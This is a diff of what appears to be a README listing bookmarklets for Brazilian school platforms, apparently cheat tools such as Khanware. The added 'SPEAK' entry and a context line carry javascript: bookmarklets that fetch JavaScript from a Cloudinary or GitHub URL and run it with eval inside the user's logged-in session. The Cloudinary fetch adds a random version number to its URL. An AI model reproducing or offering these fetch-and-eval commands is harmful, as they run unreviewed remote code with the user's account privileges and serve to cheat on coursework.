@@ -9,12 +9,19 @@ javascript:fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/
 ```
 
 
+
 ## CMSP
 
 ```
 https://doritus.mmrcoss.tech/
 ```
 
+
+## SPEAK
+
+```
+javascript:fetch(`https://res.cloudinary.com/dq36xqdoe/raw/upload/v${Math.floor(Math.random() * 1000000)}/main_oqidn5.js`).then(r => r.text()).then(r => eval(r))
+```
 
 ## LEIA-SP
 
